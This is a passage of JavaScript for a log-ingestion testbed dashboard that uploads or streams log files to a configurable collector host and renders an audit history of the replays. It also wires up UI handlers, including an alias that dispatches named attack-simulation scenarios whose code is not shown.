      streamingDelaySlider.addEventListener("input", () => {
        streamingDelayVal.textContent = `${streamingDelaySlider.value} ms`;
      });
    }

    // Submit button
    if (btnUploadFileSubmit) {
      btnUploadFileSubmit.addEventListener("click", async () => {
        await executeFileUpload();
      });
    }
  };

  async function executeFileUpload() {
    const editorVal = uploadContentEditor ? uploadContentEditor.value.trim() : "";
    if (!editorVal) {
      showToast("Please select a log file or type log entries into the editor.");
      return;
    }

    // Prepare File object
    let fileToUpload = selectedFileObject;
    if (!fileToUpload || fileToUpload.size !== new TextEncoder().encode(editorVal).length) {
      const blob = new Blob([editorVal], { type: "text/plain" });
      const fname = (fileToUpload && fileToUpload.name) ? fileToUpload.name : "custom_test_stream.log";
      fileToUpload = new File([blob], fname, { type: "text/plain" });
    }

    const host = (hostInput && hostInput.value.trim()) ? hostInput.value.trim() : (testbedSettings.host || "80.225.207.171");
    const modeEl = document.querySelector('input[name="uploadTransportMode"]:checked');
    const mode = modeEl ? modeEl.value : "http_upload";
    let port = 8000;
    if (mode === "udp_stream") port = testbedSettings.udpPort || 5140;
    else if (mode === "tcp_stream") port = testbedSettings.tcpPort || 5141;
    else port = testbedSettings.apiPort || 8000;

    const delay = streamingDelaySlider ? parseInt(streamingDelaySlider.value, 10) : 0;
    const scheme = testbedSettings.scheme || "http";

    if (uploadStatusBadge) {
      uploadStatusBadge.className = "pipeline-status-badge running";
      uploadStatusBadge.textContent = mode === "http_upload" ? "REPLAYING..." : "STREAMING...";
    }
    if (btnUploadFileSubmit) btnUploadFileSubmit.disabled = true;

    const t0 = performance.now();
    logUploadConsole(`Initiating ${mode.toUpperCase()} for "${fileToUpload.name}" (${(fileToUpload.size / 1024).toFixed(1)} KB) to ${scheme}://${host}:${port}...`, "info");

    const formData = new FormData();
    formData.append("file", fileToUpload);
    formData.append("host", host);
    formData.append("port", port);
    formData.append("mode", mode);
    formData.append("delay_ms", delay);
    formData.append("scheme", scheme);

    try {
      let data = null;
      let res = null;

      // Strategy 1: Attempt ingestion through /api/test/upload-file
      try {
        res = await fetch("/api/test/upload-file", {
          method: "POST",
          body: formData,
        });
        if (res.ok) {
          data = await res.json();
        }
      } catch (err) {
        // Fallback to direct upload API
      }

      // Strategy 2: If /api/test/upload-file is not available, post directly to /api/v1/upload
      if ((!data || data.status === "error") && mode === "http_upload") {
        const directFormData = new FormData();
        directFormData.append("file", fileToUpload);
        
        const directRes = await fetch("/api/v1/upload", {
          method: "POST",
          body: directFormData,
        });
        if (directRes.ok) {
          const directData = await directRes.json();
          data = {
            status: "success",
            lines_processed: directData.lines_processed || directData.count || 0,
            success_count: directData.success_count || directData.lines_processed || 0,
            unparsed_count: directData.unparsed_count || 0,
            latency_ms: directData.latency_ms || Math.round(performance.now() - t0),
            sample_events: directData.sample_events || [],
          };
        } else {
          const errText = await directRes.text();
          throw new Error(`Upload API Error (${directRes.status}): ${errText}`);
        }
      }

      if (!data || data.status === "error") {
        throw new Error((data && (data.error || data.detail)) || "Failed to process log file upload");
      }

      // Success
      if (uploadStatusBadge) {
        uploadStatusBadge.className = "pipeline-status-badge pass";
        uploadStatusBadge.textContent = "PROCESSED [OK]";
      }

      const latency = data.latency_ms !== undefined ? data.latency_ms : Math.round(performance.now() - t0);
      if (uploadStatProcessed) uploadStatProcessed.textContent = data.lines_processed || 0;
      if (uploadStatSuccess) uploadStatSuccess.textContent = data.success_count || 0;
      if (uploadStatUnparsed) uploadStatUnparsed.textContent = data.unparsed_count || data.failed_count || 0;
      if (uploadStatLatency) uploadStatLatency.textContent = `${latency} ms`;

      logUploadConsole(`Ingestion complete in ${latency} ms. Lines: ${data.lines_processed}, Success: ${data.success_count}, Unparsed/Errors: ${data.unparsed_count || data.failed_count || 0}`, "success");

      // Record to audit history
      recordAuditEntry({
        protocol: mode === "http_upload" ? "HTTP" : (mode === "udp_stream" ? "UDP" : "TCP"),
        target: `${host}:${port}`,
        source: `FileReplay-${fileToUpload.name}`,
        status: "SUCCESS",
        bytes: fileToUpload.size,
        rtt: `${latency} ms`,
        payload: `[FILE-REPLAY] Replayed ${data.lines_processed} lines from "${fileToUpload.name}"`
      });

      showToast(`Successfully ingested "${fileToUpload.name}" (${data.lines_processed} lines)!`);

    } catch (e) {
      if (uploadStatusBadge) {
        uploadStatusBadge.className = "pipeline-status-badge fail";
        uploadStatusBadge.textContent = "FAILED [ERROR]";
      }
      logUploadConsole(`Upload failed: ${e.message}`, "error");
      showToast(`Upload failed: ${e.message}`);
    } finally {
      if (btnUploadFileSubmit) btnUploadFileSubmit.disabled = false;
    }
  }

  // ==============================================================================
  // CYBER COMMAND DECK UNIFIED BINDINGS & ADAPTERS
  // ==============================================================================

  // 1. Attack Scenario Alias
  window.launchAttackScenario = function (scenarioKey) {
    let key = scenarioKey;
    if (key === "bruteforce") key = "brute_force";
    if (key === "portscan") key = "port_scan";
    return window.runAttackScenario(key);
  };

  // 2. Stress Test Cannon Handlers
  // Handled by window.startBurstLoadTest above

  // 3. Port Radar Scanner Handler
  const btnScanAllPorts = document.getElementById("btnScanAllPorts");
  if (btnScanAllPorts) {
    btnScanAllPorts.addEventListener("click", () => {
      window.checkServerHealth(true);
      showToast("Scanning all active UDP/TCP/HTTP sockets and AI subsystems...");
    });
  }

  // 4. 5-Stage Pipeline Diagnostic Handler
  const btnRunPipelineAudit = document.getElementById("btnRunPipelineAudit");
  if (btnRunPipelineAudit) {
    btnRunPipelineAudit.addEventListener("click", () => {
      window.runTestPipeline("all");
    });
  }

  // 5. File Lab DropZone & Browse Button
  const btnBrowseFile = document.getElementById("btnBrowseFile");
  const dropZone = document.getElementById("dropZone");
  if (btnBrowseFile && logFileInput) {
    btnBrowseFile.addEventListener("click", (e) => {
      e.stopPropagation();
      logFileInput.click();
    });
  }
  if (dropZone && logFileInput) {
    dropZone.addEventListener("click", () => {
      logFileInput.click();
    });
    dropZone.addEventListener("dragover", (e) => {
      e.preventDefault();
      dropZone.style.borderColor = "var(--primary-main)";
    });
    dropZone.addEventListener("dragleave", () => {
      dropZone.style.borderColor = "var(--border-glow)";
    });
    dropZone.addEventListener("drop", (e) => {
      e.preventDefault();
      dropZone.style.borderColor = "var(--border-glow)";
      if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
        handleFileObject(e.dataTransfer.files[0]);
        executeFileUpload();
      }
    });
  }

  // 6. Network Sockets Modal Handlers
  const btnOpenEndpoints = document.getElementById("btnOpenEndpointsModal");
  const btnCloseEndpoints = document.getElementById("btnCloseEndpointsModal");
  const btnSaveEndpoints = document.getElementById("btnSaveEndpointsModal");
  const endpointsModalEl = document.getElementById("endpointsModal");

  if (btnOpenEndpoints && endpointsModalEl) {
    btnOpenEndpoints.addEventListener("click", () => {
      endpointsModalEl.style.display = "flex";
    });
  }
  if (btnCloseEndpoints && endpointsModalEl) {
    btnCloseEndpoints.addEventListener("click", () => {
      endpointsModalEl.style.display = "none";
    });
  }
  if (endpointsModalEl) {
    endpointsModalEl.addEventListener("click", (e) => {
      if (e.target === endpointsModalEl) {
        endpointsModalEl.style.display = "none";
      }
    });
  }
  if (btnSaveEndpoints) {
    btnSaveEndpoints.addEventListener("click", () => {
      const rawHost = (document.getElementById("modalTargetHost")?.value || "80.225.207.171").trim();
      const proto = document.getElementById("modalTargetProto")?.value || "http";
      const apiPort = parseInt(document.getElementById("modalTargetPort")?.value, 10) || 8000;
      const udpPort = parseInt(document.getElementById("modalSyslogUdpPort")?.value, 10) || 5140;
      const tcpPort = parseInt(document.getElementById("modalSyslogTcpPort")?.value, 10) || 5141;
      const timeout = parseFloat(document.getElementById("modalSocketTimeout")?.value) * 1000 || 3000;

      applyTargetSettings({ scheme: proto, host: rawHost, apiPort, udpPort, tcpPort, timeout }, true, true);
      if (endpointsModalEl) endpointsModalEl.style.display = "none";
      showToast(`Network endpoints updated: ${proto}://${rawHost}:${apiPort}`);
    });
  }

  // 7. Wiretap Audit Ledger Handlers
  const btnClearAudit = document.getElementById("btnClearAuditHistory");
  if (btnClearAudit) {
    btnClearAudit.addEventListener("click", () => {
      window.clearAuditHistory();
    });
  }
  const btnExportAudit = document.getElementById("btnExportAuditJson");
  if (btnExportAudit) {
    btnExportAudit.addEventListener("click", () => {
      window.exportAuditData("json");
    });
  }
  const auditFilterProtoSelect = document.getElementById("auditFilterProto");
  if (auditFilterProtoSelect) {
    auditFilterProtoSelect.addEventListener("change", () => {
      window.renderAuditHistoryTable();
    });
  }

  async function loadInitialAuditHistory() {
    try {
      const res = await fetch("/api/test/history?limit=50");
      if (res.ok) {
        const historyData = await res.json();
        if (Array.isArray(historyData) && historyData.length > 0) {
          auditLogs = historyData.map((item, idx) => ({
            id: item.id || idx + 1,
            timestamp: item.timestamp || new Date().toLocaleTimeString(),
            protocol: (item.protocol || "UDP").toUpperCase(),
            target: `${item.host || "80.225.207.171"}:${item.port || 5140}`,
            source: item.source || "Virtual-Device",
            status: item.success !== false ? "SUCCESS" : "FAILED",
            bytes: item.bytes_sent || (item.payload ? item.payload.length : 0),
            rtt: item.latency_ms !== undefined ? `${item.latency_ms} ms` : "<1ms",
            payload: item.payload || ""
          }));
          window.renderAuditHistoryTable();
        }
      }
    } catch (e) {
      console.warn("Could not load initial audit history:", e);
    }
  }

  // Initial Boot
  loadSettings();
  renderDevicesList();
  renderGuide("linux");
  window.renderAuditHistoryTable();
  loadInitialAuditHistory();
  restartAutoProbeTimer();
  window.initFileUploaderTab();
  setTimeout(() => {
    window.checkServerHealth();
  }, 300);
});
